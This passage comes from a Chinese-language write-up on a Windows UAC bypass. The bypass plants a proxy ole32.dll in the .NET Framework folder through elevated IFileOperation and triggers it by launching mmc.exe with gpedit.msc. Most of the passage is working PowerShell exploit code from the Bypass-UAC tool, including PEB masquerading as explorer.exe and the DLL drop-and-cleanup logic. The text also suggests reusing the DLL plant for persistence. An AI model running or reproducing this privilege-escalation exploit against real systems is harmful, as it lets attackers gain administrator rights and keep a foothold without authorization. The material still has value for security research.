我们需要解决的一个问题是，DLL显然是从一个不同的目录加载，一个简短的调查显示它默认的.NET版本文件夹查找 **ole32** 。我们可以使用以下
**PowerShell** 命令获取该版本。
    # Win 7
    PS C:\> [System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion
    v2.0.50727
    # Win 10
    PS C:\> [System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion
    v4.0.30319
另一个不明显的问题是，在Bypass-UAC中的[Yamabiko代理dll](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Bypass-UAC/Yamabiko/Yamabiko/dllmain.c)打开PowerShell，PowerShell本身会引发这个错误加载bug从而导致无限shell弹出…，为了避免这种行为，我们必须检测我们的payload
dll被加载并删除它，所以它只执行一次！
### Bypass-UAC实现：
添加方法绕过UAC是很容易的，如果你想了解更多，请查看在[GitHub](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)上的项目！为了让我们的bypass更加便利，我添加了以下方法，如果有任何问题，请随时留言！
    'UacMethodNetOle32'
    {
    # Hybrid MMC method: mmc some.msc -> Microsoft.NET\Framework[64]\..\ole32.dll
    # Works on x64/x32 Win7-Win10 (unpatched)
    if ($OSMajorMinor -lt 6.1) {
    echo "[!] Your OS does not support this method!`n"
    Return
    }
    # Impersonate explorer.exe
    echo "`n[!] Impersonating explorer.exe!"
    Masquerade-PEB -BinPath "C:\Windows\explorer.exe"
    if ($DllPath) {
    echo "[>] Using custom proxy dll.."
    echo "[+] Dll path: $DllPath"
    } else {
    # Write Yamabiko.dll to disk
    echo "[>] Dropping proxy dll.."
    Emit-Yamabiko
    }
    # Get default .NET version
    [String]$Net_Version = [System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion
    # Get count of PowerShell processes
    $PS_InitCount = @(Get-Process -Name powershell).Count
    # Expose IFileOperation COM object
    Invoke-IFileOperation
    # Exploit logic
    echo "[>] Performing elevated IFileOperation::MoveItem operation.."
    # x32/x64 .NET folder
    if ($x64) {
    $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\Microsoft.NET\Framework64\' + $Net_Version + '\'), "ole32.dll")
    } else {
    $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\Microsoft.NET\Framework\' + $Net_Version + '\'), "ole32.dll")
    }
    $IFileOperation.PerformOperations()
    echo "`n[?] Executing mmc.."
    IEX $($env:SystemRoot + '\System32\mmc.exe gpedit.msc')
    # Move Yamabiko back to %tmp% after it loads to avoid infinite shells!
    while ($true) {
    $PS_Count = @(Get-Process -Name powershell).Count
    if ($PS_Count -gt $PS_InitCount) {
    try {
    # x32/x64 .NET foler
    if ($x64) {
    $IFileOperation.MoveItem($($env:SystemRoot + '\Microsoft.NET\Framework64\' + $Net_Version + '\ole32.dll'), $($env:Temp + '\'), 'ole32.dll')
    } else {
    $IFileOperation.MoveItem($($env:SystemRoot + '\Microsoft.NET\Framework\' + $Net_Version + '\ole32.dll'), $($env:Temp + '\'), 'ole32.dll')
    }
    $IFileOperation.PerformOperations()
    break
    } catch {
    # Sometimes IFileOperation throws an exception
    # when executed twice in a row, just rerun..
    }
    }
    }
    # Clean-up
    echo "[!] UAC artifact: $($env:Temp + '\ole32.dll')`n"
    }
案例结束，下面的屏幕截图演示了在Windows 8（x64）和Windows 10（x32）上的绕过。
### Win8 x64
### Win10 x32
从另一方面来说，这是一个相当不错的持久化机制。删除ole32在.NET框架文件夹中封装的DLL，计划使用.NET在启动/空闲时运行任何事情。
## 0x06 总结
如果你做到这一步，我想你就能明白为什么微软不承认UAC绕过。老实说我认为，让UAC步入正轨的最好的方法是积极的补丁机制。
* * *